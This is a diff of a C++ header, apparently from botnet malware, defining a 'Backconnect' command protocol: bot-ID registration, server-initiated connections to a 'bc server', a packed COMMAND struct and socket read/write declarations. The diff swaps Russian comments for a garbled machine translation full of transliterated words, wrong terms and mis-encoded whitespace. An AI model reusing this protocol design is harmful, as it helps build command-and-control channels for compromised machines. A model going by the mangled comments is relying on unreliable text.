@@ -5,33 +5,33 @@
 
 namespace Backconnect
 {
-  //Некотрые константы.
+  //Nekotrye constants.
   enum
   {
-    SOCKET_TIMEOUT     = 30 * 1000,     //Таймаут для сокетов.
+    SOCKET_TIMEOUT     = 30 * 1000,     //Timeout for the socket.
     KEEPALIVE_DELAY    = 5 * 60 * 1000, //Keepalive.
-    KEEPALIVE_INTERVAL = 5 * 1000       //Интервал Keepalive в случаи ошибки.
+    KEEPALIVE_INTERVAL = 5 * 1000       //Keepalive interval in case of error.
   };
   
-  //Команды для BCCOMMAND.
+  //Commands for BCCOMMAND.
   enum
   {
-    COMMAND_UNKNOWN,    //Ошибка.
-    COMMAND_BOTID,      //Послыется ботом. Информация, после структуры находится строка размером
-                        //wDataSize, несущая ID бота. Также сообшает, что данное соединение является
-                        //управляющим.
-    COMMAND_CONNECT,    //Послыается сервером. Создание нового соединения с bc сервером. Несет в
-                        //себе DWORD как уникальный ID для соединения.
-    COMMAND_IS_SERVICE, //Послыется ботом. Сообшает о том, что данное соединение является сервисным,
-                        //несет в себе DWORD полученый от COMMAND_CONNECT.
+    COMMAND_UNKNOWN,    //Error.
+    COMMAND_BOTID,      //Poslyetsya bot. Information after the structure is a string size
+                        //wDataSize, carrying ID bot. Also soobshaet that this compound is
+                        //manager.
+    COMMAND_CONNECT,    //Poslyaetsya server. Create a new connection to the bc server. Carries
+                        //DWORD itself as a unique ID for the connection.
+    COMMAND_IS_SERVICE, //Poslyetsya bot. Soobshaet that this compound is a service,
+                        //carries a DWORD received from COMMAND_CONNECT.
   };
 
   #pragma pack(push, 1)
   typedef struct
   {
-    WORD structSize; //sizeof(COMMAND)
-    WORD dataSize;   //Размер данных идуших после структуры.
-    BYTE command;    //Команда
+    WORD structSize; //sizeof (COMMAND)
+    WORD dataSize;   //Size of the data after idushih structure.
+    BYTE command;    //Team
   }COMMAND;
   #pragma pack(pop)
   
@@ -58,16 +58,15 @@ namespace Backconnect
   */
   bool _readCommand(SOCKET s, COMMAND *command, LPBYTE *data);
 
-  /*
-    Отправка команды на сокет.
+  /*В В В В Sending commands to a socket.
 
-    IN s        - сокет.
-    IN command  - команда BCC_*.
-    IN data     - данные.
-    IN dataSize - размер данных.
+В В В В IN s - socket.
+В В В В IN command - the command BCC_ *.
+В В В В IN data - data.
+В В В В IN dataSize - the size of the data.
 
-    Return      - true - в случаи успеха,
-                  false - в случаи ошибки.
-  */
+В В В В Return - true - if successful,
+В В В В В В В В В В В В В В В В В В false - if an error occurs.
+В В */
   bool _writeCommand(SOCKET s, BYTE command, const void *data, WORD dataSize);
 };
